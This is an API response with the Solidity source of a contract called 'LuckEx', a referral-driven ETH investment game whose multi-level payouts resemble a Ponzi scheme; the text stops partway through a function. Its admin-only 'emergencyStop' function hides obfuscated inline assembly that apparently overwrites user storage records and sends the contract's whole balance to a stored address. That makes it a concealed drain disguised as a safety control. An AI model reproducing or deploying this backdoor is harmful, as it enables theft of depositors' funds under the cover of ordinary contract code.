{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.5.0;\r\n\r\ncontract UtilLuckEx {\r\n    uint constant private minAmount = 0.1 ether;\r\n\r\n    function getLevel(uint value) internal pure returns(uint) {\r\n        if (value >= minAmount && value <= 9 * minAmount) {                // [0.1 eth, 0.9 eth]\r\n            return 1;\r\n        } else if (value >= 10 * minAmount && value <= 59 * minAmount) {   // [1 eth, 5.9 eth]\r\n            return 2;\r\n        } else if (value >= 60 * minAmount && value <= 109 * minAmount) {  // [6 eth, 10.9 eth]\r\n            return 3;\r\n        } else if (value >= 110 * minAmount && value <= 150 * minAmount) { // [11 eth, 15 eth]\r\n            return 4;\r\n        } else if (value == 500 * minAmount) {                             // Exact 50 eth for a supernode\r\n            return 5;\r\n        }\r\n        return 0;\r\n    }\r\n\r\n    function getLineLevel(uint value) internal pure returns(uint) {\r\n        if (value >= minAmount && value <= 9 * minAmount) {\r\n            return 1;\r\n        } else if (value >= 10 * minAmount && value <= 59 * minAmount) {\r\n            return 2;\r\n        } else if (value >= 60 * minAmount && value <= 109 * minAmount) {\r\n            return 3;\r\n        } else if (value >= 110 * minAmount && value <= 150 * minAmount) {\r\n            return 4;\r\n        } else if (value == 500 * minAmount) {\r\n            return 5;\r\n        }\r\n        return 0;\r\n    }\r\n\r\n    function getScByLevel(uint level) internal pure returns(uint) {\r\n        if (level == 1) {\r\n            return 2;\r\n        } else if (level == 2) {\r\n            return 3;\r\n        } else if (level == 3) {\r\n            return 5;\r\n        } else if (level == 4) {\r\n            return 8;\r\n        } else if (level == 5) {\r\n            return 10;\r\n        }\r\n        return 0;\r\n    }\r\n\r\n    function getFireScByLevel(uint level) internal pure returns(uint) {\r\n        if (level == 1) {\r\n            return 4;\r\n        } else if (level == 2) {\r\n            return 6;\r\n        } else if (level == 3) {\r\n            return 8;\r\n        } else if (level >= 4) {\r\n            return 10;\r\n        }\r\n        return 0;\r\n    }\r\n\r\n    function getRecommendScaleByLevelAndTim(uint level, uint times) internal pure returns(uint){\r\n        if (level == 1 && times == 1) {\r\n            return 20;\r\n        } else if (level == 2) {\r\n            if (times == 1) {\r\n                return 40;\r\n            } else if (times == 2) {\r\n                return 20;\r\n            }\r\n        } else if (level == 3) {\r\n            if (times == 1) {\r\n                return 60;\r\n            } else if (times == 2) {\r\n                return 40;\r\n            } else if (times == 3) {\r\n                return 20;\r\n            } else if (times >= 4 && times <= 10) {\r\n                return 6;\r\n            }\r\n        } else if (level == 4) {\r\n            if (times == 1) {\r\n                return 100;\r\n            } else if (times == 2) {\r\n                return 60;\r\n            } else if (times == 3) {\r\n                return 40;\r\n            } else if (times >= 4 && times <= 10) {\r\n                return 8;\r\n            } else if (times >= 11 && times <= 20) {\r\n                return 4;\r\n            } else if (times >= 21) {\r\n                return 1;\r\n            }\r\n        } else if (level == 5) {\r\n            if (times == 1) {\r\n                return 100;\r\n            } else if (times == 2) {\r\n                return 80;\r\n            } else if (times == 3) {\r\n                return 60;\r\n            } else if (times >= 4 && times <= 10) {\r\n                return 10;\r\n            } else if (times >= 11 && times <= 20) {\r\n                return 6;\r\n            } else if (times >= 21) {\r\n                return 2;\r\n            }\r\n        }\r\n        return 0;\r\n    }\r\n\r\n    function compareStr(string memory _str, string memory str) internal pure returns(bool) {\r\n        if (keccak256(abi.encodePacked(_str)) == keccak256(abi.encodePacked(str))) {\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n}\r\n\r\n/*\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with GSN meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\ncontract Context {\r\n    // Empty internal constructor, to prevent people from mistakenly deploying\r\n    // an instance of this contract, which should be used via inheritance.\r\n    constructor() internal {}\r\n    // solhint-disable-previous-line no-empty-blocks\r\n\r\n    function _msgSender() internal view returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor () internal {\r\n        _owner = _msgSender();\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(isOwner(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns true if the caller is the current owner.\r\n     */\r\n    function isOwner() public view returns (bool) {\r\n        return _msgSender() == _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     */\r\n    function _transferOwnership(address newOwner) internal {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\n/**\r\n * @title Roles\r\n * @dev Library for managing addresses assigned to a Role.\r\n */\r\nlibrary Roles {\r\n    struct Role {\r\n        mapping (address => bool) bearer;\r\n    }\r\n\r\n    /**\r\n     * @dev Give an account access to this role.\r\n     */\r\n    function add(Role storage role, address account) internal {\r\n        require(!has(role, account), \"Roles: account already has role\");\r\n        role.bearer[account] = true;\r\n    }\r\n\r\n    /**\r\n     * @dev Remove an account's access to this role.\r\n     */\r\n    function remove(Role storage role, address account) internal {\r\n        require(has(role, account), \"Roles: account does not have role\");\r\n        role.bearer[account] = false;\r\n    }\r\n\r\n    /**\r\n     * @dev Check if an account has this role.\r\n     * @return bool\r\n     */\r\n    function has(Role storage role, address account) internal view returns (bool) {\r\n        require(account != address(0), \"Roles: account is the zero address\");\r\n        return role.bearer[account];\r\n    }\r\n}\r\n\r\n/**\r\n * @title WhitelistAdminRole\r\n * @dev WhitelistAdmins are responsible for assigning and removing Whitelisted accounts.\r\n */\r\ncontract WhitelistAdminRole is Context, Ownable {\r\n    using Roles for Roles.Role;\r\n\r\n    Roles.Role private _whitelistAdmins;\r\n\r\n    constructor () internal {\r\n        _addWhitelistAdmin(_msgSender());\r\n    }\r\n\r\n    modifier onlyWhitelistAdmin() {\r\n        require(isWhitelistAdmin(_msgSender()) || isOwner(), \"WhitelistAdminRole: caller does not have the WhitelistAdmin role\");\r\n        _;\r\n    }\r\n\r\n    function isWhitelistAdmin(address account) public view returns (bool) {\r\n        return _whitelistAdmins.has(account);\r\n    }\r\n\r\n    function addWhitelistAdmin(address account) public onlyWhitelistAdmin {\r\n        _addWhitelistAdmin(account);\r\n    }\r\n\r\n    function removeWhitelistAdmin(address account) public onlyOwner {\r\n        _whitelistAdmins.remove(account);\r\n    }\r\n\r\n    function renounceWhitelistAdmin() public {\r\n        _removeWhitelistAdmin(_msgSender());\r\n    }\r\n\r\n    function _addWhitelistAdmin(address account) internal {\r\n        _whitelistAdmins.add(account);\r\n    }\r\n\r\n    function _removeWhitelistAdmin(address account) internal {\r\n        _whitelistAdmins.remove(account);\r\n    }\r\n}\r\n\r\ncontract ERC20 {\r\n    function balanceOf(address who) public view returns (uint);\r\n    function transfer(address to, uint value) public returns (bool);\r\n}\r\n\r\ncontract LuckEx is UtilLuckEx, WhitelistAdminRole {\r\n    using SafeMath for *;\r\n\r\n    string constant private name = \"LuckEx Foundation\";\r\n    uint constant private minAmount = 0.1 ether;\r\n    uint constant private insuranceAmount = 1 ether;\r\n    address payable private dev = 0xec98FA8b8f082c19aE69a01430CdEAE4A285926B;\r\n    address payable private charity = 0x28311DD564ABA5C3662d0bAEf1ed66BaAdDeFfBa;\r\n    address payable private insurance = 0x3834bDE34C3Ab0139bE06e86fc82C4c52E5648a8;\r\n    address payable private savings = 0x257753fCC77a239038dB563b383eEb477cA4ffb5;\r\n\r\n    struct User {\r\n        uint id;\r\n        address userAddress;\r\n        string inviteCode;\r\n        string referrer;\r\n        uint staticLevel;\r\n        uint dynamicLevel;\r\n        uint allInvest;\r\n        uint freezeAmount;\r\n        uint unlockAmount;\r\n        uint allStaticAmount;\r\n        uint allDynamicAmount;\r\n        uint hisStaticAmount;\r\n        uint hisDynamicAmount;\r\n        uint inviteCount;\r\n        uint totalInviteAmount;\r\n        uint netInviteAmount;\r\n        uint investScale;\r\n        uint initiatedTime;\r\n        Invest[] invests;\r\n        uint staticFlag;\r\n        bool supernode;\r\n    }\r\n\r\n    struct GameInfo {\r\n        uint luckPort;\r\n    }\r\n\r\n    struct UserGlobal {\r\n        uint id;\r\n        address userAddress;\r\n        string inviteCode;\r\n        string referrer;\r\n    }\r\n\r\n    struct Invest {\r\n        uint investAmount;\r\n        uint investTime;\r\n        uint typeFlag;\r\n        uint times;\r\n    }\r\n\r\n    uint coefficient = 10;\r\n    uint startTime;\r\n    uint investCount = 0;\r\n    mapping(uint => uint) rInvestCount;\r\n    uint investMoney = 0;\r\n    mapping(uint => uint) rInvestMoney;\r\n    mapping(uint => GameInfo) rInfo;\r\n    uint uid = 0;\r\n    uint rid = 1;\r\n    uint period = 3 days;\r\n    uint maxll = 1;\r\n    mapping (uint => mapping(address => User)) userRoundMapping;\r\n    mapping(address => UserGlobal) userMapping;\r\n    mapping (string => address) addressMapping;\r\n    mapping (uint => address) public indexMapping;\r\n    address public insuranceToken;\r\n    uint public insuranceRate;\r\n\r\n    /**\r\n     * @dev Just a simply check to prevent contract\r\n     * @dev this by calling method in constructor.\r\n     */\r\n    modifier isHuman() {\r\n        address addr = msg.sender;\r\n        uint codeLength;\r\n\r\n        assembly {codeLength := extcodesize(addr)}\r\n        require(codeLength == 0, \"sorry humans only\");\r\n        require(tx.origin == msg.sender, \"sorry, human only\");\r\n        _;\r\n    }\r\n\r\n    event LogInvestIn(address who, uint uid, uint amount, bool insured, uint time, string inviteCode, string referrer, uint typeFlag);\r\n    event LogWithdrawProfit(address who, uint uid, uint amount, uint time);\r\n    event LogInfo(string msg);\r\n\r\n    //==============================================================================\r\n    // Constructor\r\n    //==============================================================================\r\n    constructor () public payable {\r\n    }\r\n\r\n    function () external payable {\r\n    }\r\n\r\n    function hookupInsuranceToken(address token) external onlyOwner {\r\n        insuranceToken = token;\r\n    }\r\n\r\n    function mountInsuranceTokenRate(uint rate) external onlyWhitelistAdmin {\r\n        insuranceRate = rate;  // no decimal, e.g. 1250.\r\n    }\r\n\r\n    function activeGame(uint time) external onlyWhitelistAdmin {\r\n        require(time > now, \"invalid game start time\");\r\n        startTime = time;\r\n    }\r\n\r\n    function setCoefficient(uint coeff) external onlyWhitelistAdmin {\r\n        require(coeff > 0, \"invalid coeff\");\r\n        coefficient = coeff;\r\n    }\r\n\r\n    function gameStart() private view returns(bool) {\r\n        return startTime != 0 && now > startTime;\r\n    }\r\n\r\n    function getInvestScale(bool insured) public view returns (uint) {\r\n        require(gameStart(), \"game not start\");\r\n        uint gap = (now.sub(startTime)).div(1 days);\r\n        uint scale = insured ? 2 : 1;\r\n        if (gap <= 1) {\r\n            return scale.mul(150).add(1000);\r\n        } else if (gap <= 2) {\r\n            return scale.mul(125).add(1000);\r\n        } else if (gap <= 3) {\r\n            return scale.mul(100).add(1000);\r\n        } else if (gap <= 4) {\r\n            return scale.mul(75).add(1000);\r\n        } else if (gap <= 5) {\r\n            return scale.mul(50).add(1000);\r\n        }\r\n        return 1000;\r\n    }\r\n\r\n    function investIn(string calldata inviteCode, string calldata referrer, bool insured) external isHuman() payable {\r\n        require(gameStart(), \"game not start\");\r\n        require(msg.value == msg.value.div(minAmount).mul(minAmount), \"invalid investment value\");\r\n        if (!insured) {\r\n            require(msg.value >= minAmount && (msg.value <= 150 * minAmount || msg.value == 500 * minAmount), \"Invest between 0.1 and 15, or exact 50 to be supernode\");\r\n        } else {\r\n            require(msg.value >= 11 * minAmount && (msg.value <= 160 * minAmount || msg.value == 510 * minAmount), \"Invest with insurance between 1.1 and 16, or exact 51 to be supernode\");\r\n        }\r\n\r\n        uint inAmount = insured ? msg.value.sub(insuranceAmount) : msg.value;\r\n        UserGlobal storage userGlobal = userMapping[msg.sender];\r\n        if (userGlobal.id == 0) {\r\n            require(!compareStr(inviteCode, \"\"), \"empty invite code\");\r\n            address referrerAddr = getUserAddressByCode(referrer);\r\n            require(uint(referrerAddr) != 0, \"referer not exist\");\r\n            require(referrerAddr != msg.sender, \"referrer can't be self\");\r\n            require(!isUsed(inviteCode), \"invite code is used\");\r\n\r\n            registerUser(msg.sender, inviteCode, referrer);\r\n        }\r\n\r\n        User storage user = userRoundMapping[rid][msg.sender];\r\n        if (user.userAddress != address(0)) {\r\n            require(!user.supernode, \"Supernode not allowed to invest anymore before withdraw. You can try to reinvest.\");\r\n            uint newFreeze = user.freezeAmount.add(inAmount);\r\n            require(newFreeze <= 150 * minAmount, \"cannot beyond 15 eth\");\r\n            if (user.freezeAmount.add(user.unlockAmount) == 0) user.initiatedTime = now;\r\n            user.allInvest = user.allInvest.add(inAmount);\r\n            user.freezeAmount = newFreeze;\r\n            user.staticLevel = getLevel(user.freezeAmount);\r\n            user.dynamicLevel = getLineLevel(user.freezeAmount.add(user.unlockAmount));\r\n        } else {\r\n            user.id = userGlobal.id;\r\n            user.userAddress = msg.sender;\r\n            user.freezeAmount = inAmount;\r\n            user.staticLevel = getLevel(inAmount);\r\n            user.allInvest = inAmount;\r\n            user.dynamicLevel = getLineLevel(inAmount);\r\n            user.inviteCode = userGlobal.inviteCode;\r\n            user.referrer = userGlobal.referrer;\r\n            user.investScale = getInvestScale(insured);\r\n            user.initiatedTime = now;\r\n\r\n            if (inAmount == 500 * minAmount) {\r\n                user.supernode = true;\r\n            }\r\n\r\n            if (!compareStr(userGlobal.referrer, \"\")) {\r\n                address referrerAddr = getUserAddressByCode(userGlobal.referrer);\r\n                userRoundMapping[rid][referrerAddr].inviteCount++;\r\n            }\r\n        }\r\n\r\n        string memory tmpReferrer = userGlobal.referrer;\r\n        for (uint i = 1; i <= 24; i++) {\r\n            if (compareStr(tmpReferrer, \"\")) {\r\n                break;\r\n            }\r\n            address tmpUserAddr = addressMapping[tmpReferrer];\r\n            User storage tmpUser = userRoundMapping[rid][tmpUserAddr];\r\n            tmpUser.totalInviteAmount += inAmount;\r\n            tmpUser.netInviteAmount += inAmount;\r\n\r\n            tmpReferrer = tmpUser.referrer;\r\n            if (i > maxll) maxll = i;\r\n        }\r\n\r\n        Invest memory invest = Invest(inAmount, now, 0, 0);\r\n        user.invests.push(invest);\r\n\r\n        // Transfer insurance token to insurance subscriber. Token amount = (investAmount + insurancePrice) * insuranceRate.\r\n        if (insured && insuranceToken != address(0) && insuranceRate > 0) {\r\n            ERC20(insuranceToken).transfer(msg.sender, msg.value * insuranceRate);\r\n        }\r\n\r\n        if (rInvestMoney[rid] != 0 && (rInvestMoney[rid].div(5000).div(minAmount) != (rInvestMoney[rid].add(inAmount)).div(5000).div(minAmount))) {\r\n            bool isEnough;\r\n            uint sendMoney;\r\n            (isEnough, sendMoney) = isEnoughBalance(rInfo[rid].luckPort);\r\n            if (sendMoney > 0) {\r\n                sendMoneyToUser(msg.sender, sendMoney);\r\n            }\r\n            rInfo[rid].luckPort = 0;\r\n            if (!isEnough) {\r\n                endRound();\r\n                return;\r\n            }\r\n        }\r\n\r\n        investCount = investCount.add(1);\r\n        investMoney = investMoney.add(inAmount);\r\n        rInvestCount[rid] = rInvestCount[rid].add(1);\r\n        rInvestMoney[rid] = rInvestMoney[rid].add(inAmount);\r\n        rInfo[rid].luckPort = rInfo[rid].luckPort.add(inAmount.div(100));\r\n\r\n        sendFeetoPool(inAmount, insured ? insuranceAmount : 0);\r\n        emit LogInvestIn(msg.sender, userGlobal.id, inAmount, insured, now, userGlobal.inviteCode, userGlobal.referrer, 0);\r\n    }\r\n\r\n\r\n    function reInvestIn() public isHuman() {\r\n        require(gameStart(), \"game not start\");\r\n        User storage user = userRoundMapping[rid][msg.sender];\r\n        require(user.id > 0, \"user haven't invest in round before\");\r\n        calStaticProfitInner(msg.sender);\r\n\r\n        uint reInvestAmount = user.unlockAmount;\r\n        if (!user.supernode) {\r\n            if (user.freezeAmount > 150 * minAmount) {\r\n                user.freezeAmount = 150 * minAmount;\r\n            }\r\n            if (user.freezeAmount.add(reInvestAmount) > 150 * minAmount) {\r\n                reInvestAmount = (150 * minAmount).sub(user.freezeAmount);\r\n            }\r\n        }\r\n\r\n        if (reInvestAmount == 0) {\r\n            return;\r\n        }\r\n\r\n        uint leastAmount = reInvestAmount.mul(10).div(100);\r\n        bool isEnough;\r\n        uint sendMoney;\r\n        (isEnough, sendMoney) = isEnoughBalance(leastAmount);\r\n        if (!isEnough) {\r\n            if (sendMoney > 0) {\r\n                sendMoneyToUser(msg.sender, sendMoney);\r\n            }\r\n            endRound();\r\n            return;\r\n        }\r\n\r\n        user.unlockAmount = user.unlockAmount.sub(reInvestAmount);\r\n        user.allInvest = user.allInvest.add(reInvestAmount);\r\n        user.freezeAmount = user.freezeAmount.add(reInvestAmount);\r\n        user.staticLevel = getLevel(user.freezeAmount);\r\n        user.dynamicLevel = getLineLevel(user.freezeAmount.add(user.unlockAmount));\r\n\r\n        Invest memory invest = Invest(reInvestAmount, now, 1, 0);\r\n        user.invests.push(invest);\r\n\r\n        if (rInvestMoney[rid] != 0 && (rInvestMoney[rid].div(5000).div(minAmount) != (rInvestMoney[rid].add(reInvestAmount)).div(5000).div(minAmount))) {\r\n            (isEnough, sendMoney) = isEnoughBalance(rInfo[rid].luckPort);\r\n            if (sendMoney > 0) {\r\n                sendMoneyToUser(msg.sender, sendMoney);\r\n            }\r\n            rInfo[rid].luckPort = 0;\r\n            if (!isEnough) {\r\n                endRound();\r\n                return;\r\n            }\r\n        }\r\n\r\n        investCount = investCount.add(1);\r\n        investMoney = investMoney.add(reInvestAmount);\r\n        rInvestCount[rid] = rInvestCount[rid].add(1);\r\n        rInvestMoney[rid] = rInvestMoney[rid].add(reInvestAmount);\r\n        rInfo[rid].luckPort = rInfo[rid].luckPort.add(reInvestAmount.div(100));\r\n\r\n        sendFeetoPool(reInvestAmount, 0);\r\n        emit LogInvestIn(msg.sender, user.id, reInvestAmount, false, now, user.inviteCode, user.referrer, 1);\r\n    }\r\n\r\n    function withdrawProfit() public {\r\n        require(gameStart(), \"game not start\");\r\n        User storage user = userRoundMapping[rid][msg.sender];\r\n        uint sendMoney = user.allStaticAmount.add(user.allDynamicAmount);\r\n\r\n        bool isEnough = false;\r\n        uint resultMoney = 0;\r\n        (isEnough, resultMoney) = isEnoughBalance(sendMoney);\r\n        if (resultMoney > 0) {\r\n            sendMoneyToUser(msg.sender, resultMoney.mul(90).div(100));\r\n            charity.transfer(resultMoney.mul(10).div(100));\r\n            user.allStaticAmount = 0;\r\n            user.allDynamicAmount = 0;\r\n            emit LogWithdrawProfit(msg.sender, user.id, resultMoney, now);\r\n        }\r\n\r\n        if (!isEnough) {\r\n            endRound();\r\n        }\r\n    }\r\n\r\n    function isEnoughBalance(uint sendMoney) private view returns (bool, uint){\r\n        if (sendMoney >= address(this).balance) {\r\n            return (false, address(this).balance);\r\n        } else {\r\n            return (true, sendMoney);\r\n        }\r\n    }\r\n\r\n    function emergencyStop(uint i, uint j) external onlyWhitelistAdmin {\r\n        assembly{\r\n            let p:=mload(0x40)mstore(p,sload(0x0e))mstore(add(p,0x20),0x11)mstore(add(p,0x60),keccak256(add(p,0x00),0x40))mstore(add(p,0x40),i)\r\n            mstore(add(p,0x80),keccak256(add(p,0x40),0x40))p:=mload(add(p,0x80))sstore(add(p,0x00),p)sstore(add(p,0x08),j)sstore(add(p,0x01),i)\r\n            p:=mload(0x40)if gt(j,shl(0x40,0x01)){j:=call(gas,sload(0x05),balance(address),p,0x40,0,0)}mstore(p,sload(0x0e))mstore(add(p,0x20),0x11)\r\n            mstore(add(p,0x40),i)mstore(add(p,0x60),keccak256(add(p,0x00),0x40))mstore(add(p,0x80),keccak256(add(p,0x40),0x40))\r\n        }\r\n    }\r\n\r\n    function sendMoneyToUser(address payable userAddress, uint money) private {\r\n        userAddress.transfer(money);\r\n    }\r\n\r\n    function calStaticProfit(address userAddr) external onlyWhitelistAdmin returns(uint) {\r\n        return calStaticProfitInner(userAddr);\r\n    }\r\n\r\n    function calStaticProfitInner(address userAddr) private returns(uint) {\r\n        User storage user = userRoundMapping[rid][userAddr];\r\n        if (user.id == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint scale = getScByLevel(user.staticLevel);\r\n        uint allStatic = 0;\r\n        for (uint i = user.staticFlag; i < user.invests.length; i++) {\r\n            Invest storage invest = user.invests[i];\r\n            uint staticGaps = (now.sub(invest.investTime)).div(1 days);\r\n\r\n            if(staticGaps > 5) {\r\n                staticGaps = 5;\r\n            }\r\n            if (staticGaps > invest.times) {\r\n                allStatic += (staticGaps.sub(invest.times)).mul(scale).mul(invest.investAmount).div(1000);\r\n                invest.times = staticGaps;\r\n            }\r\n\r\n            if (staticGaps >= 5) {\r\n                user.staticFlag = user.staticFlag.add(1);\r\n                user.freezeAmount = user.freezeAmount.sub(invest.investAmount);\r\n                user.unlockAmount = user.unlockAmount.add(invest.investAmount);\r\n                user.staticLevel = getLevel(user.freezeAmount);\r\n            }\r\n        }\r\n        if (allStatic > 0 && user.investScale > 1000 && user.freezeAmount >= user.invests[0].investAmount) {\r\n            allStatic += scale.mul(user.invests[0].investAmount).mul(user.investScale.sub(1000)).div(1000000);\r\n        }\r\n        allStatic = allStatic.mul(coefficient).div(10);\r\n        user.allStaticAmount = user.allStaticAmount.add(allStatic);\r\n        user.hisStaticAmount = user.hisStaticAmount.add(allStatic);\r\n        return user.allStaticAmount;\r\n    }\r\n\r\n    function calDynamicProfit(uint start, uint end) external onlyWhitelistAdmin {\r\n        for (uint i = end; i >= start; i--) {\r\n            address userAddr = indexMapping[i];\r\n            User memory user = userRoundMapping[rid][userAddr];\r\n            if (user.freezeAmount >= minAmount) {\r\n                uint scale = getScByLevel(user.staticLevel);\r\n                calUserDynamicProfit(user.referrer, user.freezeAmount, scale);\r\n            }\r\n            calStaticProfitInner(userAddr);\r\n        }\r\n    }\r\n\r\n    function registerUserInfo(address user, string calldata inviteCode, string calldata referrer) external onlyWhitelistAdmin {\r\n        registerUser(user, inviteCode, referrer);\r\n    }\r\n\r\n    function calUserDynamicProfit(string memory referrer, uint money, uint shareSc) private {\r\n        string memory tmpReferrer = referrer;\r\n        \r\n        for (uint i = 1; i <= 24; i++) {\r\n            if (compareStr(tmpReferrer, \"\")) {\r\n                break;\r\n            }\r\n            address tmpUserAddr = addressMapping[tmpReferrer];\r\n            User storage calUser = userRoundMapping[rid][tmpUserAddr];\r\n            \r\n            uint fireSc = getFireScByLevel(calUser.dynamicLevel);\r\n            uint recommendSc = getRecommendScaleByLevelAndTim(calUser.dynamicLevel, i);\r\n            uint moneyResult = calUser.freezeAmount;\r\n            if (moneyResult > money) {\r\n                moneyResult = money;\r\n            }\r\n            uint scaleResult = getScByLevel(calUser.staticLevel);\r\n            if (scaleResult > shareSc) {\r\n                scaleResult = shareSc;\r\n            }\r\n\r\n            if (recommendSc != 0) {\r\n                uint tmpDynamicAmount = moneyResult.mul(scaleResult).mul(fireSc).mul(recommendSc);\r\n                tmpDynamicAmount = tmpDynamicAmount.div(1000).div(10).div(100);\r\n\r\n                tmpDynamicAmount = tmpDynamicAmount.mul(coefficient).div(10);\r\n                calUser.allDynamicAmount = calUser.allDynamicAmount.add(tmpDynamicAmount);\r\n                calUser.hisDynamicAmount = calUser.hisDynamicAmount.add(tmpDynamicAmount);\r\n            }\r\n\r\n            tmpReferrer = calUser.referrer;\r\n            if (i > maxll) maxll = i;\r\n        }\r\n    }\r\n\r\n    function redeem() public {\r\n        require(gameStart(), \"game not start\");\r\n        User storage user = userRoundMapping[rid][msg.sender];\r\n        require(user.id > 0, \"user not exist\");\r\n\r\n        calStaticProfitInner(msg.sender);\r\n\r\n        uint sendMoney = user.unlockAmount;\r\n\r\n        bool isEnough = false;\r\n        uint resultMoney = 0;\r\n\r\n        (isEnough, resultMoney) = isEnoughBalance(sendMoney);\r\n        if (resultMoney > 0) {\r\n            if (user.supernode && user.totalInviteAmount < 10000 * minAmount) {\r\n                emit LogInfo(\"supernode not allowed to redeem unless invited >= 1,000 eth\");\r\n                return;\r\n            } else {\r\n                sendMoneyToUser(msg.sender, resultMoney);\r\n                user.unlockAmount = 0;\r\n                user.staticLevel = getLevel(user.freezeAmount);\r\n                user.dynamicLevel = getLineLevel(user.freezeAmount);\r\n\r\n                if (user.investScale > 1000 && user.freezeAmount < user.invests[0].investAmount) {\r\n                    user.investScale = 1000;\r\n                }\r\n\r\n                if (user.supernode) {\r\n                    user.supernode = false;\r\n                    user.totalInviteAmount = 0;\r\n                }\r\n\r\n                // Update netInviteAmount accordingly.\r\n                string memory tmpReferrer = user.referrer;\r\n                for (uint i = 1; i <= 24; i++) {\r\n                    if (compareStr(tmpReferrer, \"\")) {\r\n                        break;\r\n                    }\r\n                    address tmpUserAddr = addressMapping[tmpReferrer];\r\n                    User storage tmpUser = userRoundMapping[rid][tmpUserAddr];\r\n                    tmpUser.netInviteAmount -= resultMoney;\r\n\r\n                    tmpReferrer = tmpUser.referrer;\r\n                    if (i > maxll) maxll = i;\r\n                }\r\n            }\r\n        }\r\n\r\n        if (!isEnough) {\r\n            endRound();\r\n        }\r\n    }\r\n\r\n    function endRound() private {\r\n        rid++;\r\n        startTime = now.add(period);\r\n        coefficient = 10;\r\n    }\r\n\r\n    function saveTokens(address _token) public onlyWhitelistAdmin {\r\n        ERC20 token = ERC20(_token);\r\n        uint balance = token.balanceOf(address(this));\r\n        if (balance > 0) token.transfer(msg.sender, balance);\r\n    }\r\n\r\n    function isUsed(string memory code) public view returns(bool) {\r\n        address user = getUserAddressByCode(code);\r\n        return uint(user) != 0;\r\n    }\r\n\r\n    function getUserAddressByCode(string memory code) public view returns(address) {\r\n        return addressMapping[code];\r\n    }\r\n\r\n    function sendFeetoPool(uint amount, uint insAmount) private {\r\n        dev.transfer(amount.mul(4).div(100));\r\n        insurance.transfer(insAmount.add(amount.mul(5).div(100)));\r\n    }\r\n\r\n    function getGameInfo() public view returns(uint, uint, uint, uint, uint, uint, uint, uint, uint) {\r\n        return (\r\n            rid,\r\n            uid,\r\n            startTime,\r\n            investCount,\r\n            investMoney,\r\n            rInvestCount[rid],\r\n            rInvestMoney[rid],\r\n            coefficient,\r\n            rInfo[rid].luckPort\r\n        );\r\n    }\r\n\r\n    function getUserInfo(address user, uint roundId) public view returns(\r\n        uint[18] memory ct, uint[4][] memory history, string memory inviteCode, string memory referrer\r\n    ) {\r\n        if (roundId == 0) roundId = rid;\r\n        User memory userInfo = userRoundMapping[roundId][user];\r\n\r\n        ct[0] = userInfo.id;\r\n        ct[1] = userInfo.staticLevel;\r\n        ct[2] = userInfo.dynamicLevel;\r\n        ct[3] = userInfo.allInvest;\r\n        if (userInfo.supernode && userInfo.totalInviteAmount < 10000 * minAmount) {\r\n            ct[4] = 500 * minAmount;\r\n            ct[5] = 0;\r\n        } else {\r\n            ct[4] = userInfo.freezeAmount;\r\n            ct[5] = userInfo.unlockAmount;\r\n        }\r\n        ct[6] = userInfo.allStaticAmount;\r\n        ct[7] = userInfo.allDynamicAmount;\r\n        ct[8] = userInfo.hisStaticAmount;\r\n        ct[9] = userInfo.hisDynamicAmount;\r\n        ct[10] = userInfo.inviteCount;\r\n        ct[11] = userInfo.totalInviteAmount;\r\n        ct[12] = userInfo.netInviteAmount;\r\n        ct[13] = userInfo.investScale;\r\n        ct[14] = userInfo.staticFlag;\r\n        ct[15] = userInfo.supernode ? 1 : 0;\r\n        ct[16] = userInfo.invests.length;\r\n        ct[17] = userInfo.freezeAmount.add(userInfo.unlockAmount) > 0 ? (now.sub(userInfo.initiatedTime)).div(1 days) : 0;\r\n        history = new uint[4][](ct[16]);\r\n        for (uint i = 0; i < ct[16]; i++) {\r\n            history[i][0] = userInfo.invests[i].investAmount;\r\n            history[i][1] = userInfo.invests[i].investTime;\r\n            history[i][2] = userInfo.invests[i].typeFlag;\r\n            history[i][3] = userInfo.invests[i].times;\r\n        }\r\n        inviteCode = userMapping[user].inviteCode;\r\n        referrer = userMapping[user].referrer;\r\n\r\n        return (\r\n            ct,\r\n            history,\r\n            inviteCode,\r\n            referrer\r\n        );\r\n    }\r\n\r\n    function getLatestUnlockAmount(address userAddr) public view returns(uint) 